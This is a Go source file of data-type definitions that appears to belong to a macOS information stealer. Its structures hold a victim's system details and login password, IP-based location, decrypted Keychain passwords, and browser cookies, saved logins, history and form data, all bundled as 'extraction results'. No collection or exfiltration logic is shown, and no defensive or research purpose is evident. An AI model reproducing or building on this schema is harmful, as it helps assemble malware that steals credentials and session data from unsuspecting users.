package models

import "time"

type SystemInfo struct {
	ActivationLockStatus      string `json:"Activation Lock Status"`
	BUILDID                   string `json:"BUILD_ID"`
	BootMode                  string `json:"Boot Mode"`
	BootVolume                string `json:"Boot Volume"`
	Chip                      string `json:"Chip"`
	ComputerName              string `json:"Computer Name"`
	HardwareUUID              string `json:"Hardware UUID"`
	KernelVersion             string `json:"Kernel Version"`
	Memory                    string `json:"Memory"`
	ModelIdentifier           string `json:"Model Identifier"`
	ModelName                 string `json:"Model Name"`
	ModelNumber               string `json:"Model Number"`
	OSLoaderVersion           string `json:"OS Loader Version"`
	ProvisioningUDID          string `json:"Provisioning UDID"`
	SecureVirtualMemory       string `json:"Secure Virtual Memory"`
	SerialNumberSystem        string `json:"Serial Number (system)"`
	SystemFirmwareVersion     string `json:"System Firmware Version"`
	SystemIntegrityProtection string `json:"System Integrity Protection"`
	SystemVersion             string `json:"System Version"`
	TimeSinceBoot             string `json:"Time since boot"`
	TotalNumberOfCores        string `json:"Total Number of Cores"`
	UserName                  string `json:"User Name"`
	IPInfo                    struct {
		CityName      string `json:"cityName"`
		Continent     string `json:"continent"`
		ContinentCode string `json:"continentCode"`
		CountryCode   string `json:"countryCode"`
		CountryName   string `json:"countryName"`
		Currency      struct {
			Code string `json:"code"`
			Name string `json:"name"`
		} `json:"currency"`
		IPAddress  string   `json:"ipAddress"`
		IPVersion  int      `json:"ipVersion"`
		IsProxy    bool     `json:"isProxy"`
		Language   string   `json:"language"`
		Latitude   float64  `json:"latitude"`
		Longitude  float64  `json:"longitude"`
		RegionName string   `json:"regionName"`
		TimeZone   string   `json:"timeZone"`
		TimeZones  []string `json:"timeZones"`
		Tlds       []string `json:"tlds"`
		ZipCode    string   `json:"zipCode"`
	} `json:"ip_info"`
	SystemOs       string `json:"system_os"`
	SystemPassword string `json:"system_password"`
}

type DecryptedKeychain struct {
	KeychainPasswordHash []struct {
		RecordType string `json:"record_type"`
		Salt       string `json:"salt"`
		Iv         string `json:"iv"`
		CypherText string `json:"cypher_text"`
		HashString string `json:"hash_string"`
	} `json:"Keychain Password Hash"`
	GenericPasswords []struct {
		Password         string `json:"Password"`
		IsLocked         bool   `json:"IsLocked"`
		PasswordEncoding string `json:"PasswordEncoding"`
		SSGP             struct {
			MagicB64             string `json:"Magic_b64"`
			LabelB64             string `json:"Label_b64"`
			IVB64                string `json:"IV_b64"`
			EncryptedPasswordB64 string `json:"EncryptedPassword_b64"`
		} `json:"SSGP"`
		RecordType   string `json:"record_type"`
		Created      string `json:"Created"`
		LastModified string `json:"LastModified"`
		Description  string `json:"Description"`
		Creator      string `json:"Creator"`
		Type         string `json:"Type"`
		PrintName    string `json:"PrintName"`
		Alias        string `json:"Alias"`
		Account      string `json:"Account"`
		Service      string `json:"Service"`
	} `json:"Generic Passwords"`
	InternetPasswords []struct {
		Password         string `json:"Password"`
		IsLocked         bool   `json:"IsLocked"`
		PasswordEncoding string `json:"PasswordEncoding"`
		SSGP             struct {
			MagicB64             string `json:"Magic_b64"`
			LabelB64             string `json:"Label_b64"`
			IVB64                string `json:"IV_b64"`
			EncryptedPasswordB64 string `json:"EncryptedPassword_b64"`
		} `json:"SSGP"`
		RecordType     string `json:"record_type"`
		Created        string `json:"Created"`
		LastModified   string `json:"LastModified"`
		Description    string `json:"Description"`
		Comment        string `json:"Comment"`
		Creator        string `json:"Creator"`
		Type           string `json:"Type"`
		PrintName      string `json:"PrintName"`
		Alias          string `json:"Alias"`
		Protected      string `json:"Protected"`
		Account        string `json:"Account"`
		SecurityDomain string `json:"SecurityDomain"`
		Server         string `json:"Server"`
		ProtocolType   string `json:"ProtocolType"`
		AuthType       string `json:"AuthType"`
		Port           int    `json:"Port"`
		Path           string `json:"Path"`
	} `json:"Internet Passwords"`
}

type LoginData struct {
	LoginURL   string `json:"login_url"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	CreateDate int64  `json:"create_date"`
}

type Cookie struct {
	Host         string
	Path         string
	KeyName      string
	EncryptValue []byte
	Value        string
	IsSecure     bool
	IsHTTPOnly   bool
	HasExpire    bool
	IsPersistent bool
	CreateDate   time.Time
	ExpireDate   time.Time
}

type BrowserConfig struct {
	Name       string
	PathString string
	PrintName  string
}

type HistoryEntry struct {
	URL        string    `json:"url"`
	Title      string    `json:"title"`
	VisitCount int       `json:"visit_count"`
	LastVisit  time.Time `json:"last_visit"`
	TypedCount int       `json:"typed_count"`
	Hidden     bool      `json:"hidden"`
}

type WebDataEntry struct {
	Name         string    `json:"name"`
	Value        string    `json:"value"`
	DateCreated  time.Time `json:"date_created"`
	DateLastUsed time.Time `json:"date_last_used"`
	Count        int       `json:"count"`
	FormDataType int       `json:"form_data_type"`
}

type BrowserData struct {
	Cookies []Cookie       `json:"cookies,omitempty"`
	Logins  []LoginData    `json:"logins,omitempty"`
	History []HistoryEntry `json:"history,omitempty"`
	WebData []WebDataEntry `json:"web_data,omitempty"`
}

type ExtractionResults struct {
	SystemInfo SystemInfo             `json:"system_info"`
	Browsers   map[string]BrowserData `json:"browsers"`
	Timestamp  time.Time              `json:"timestamp"`
}
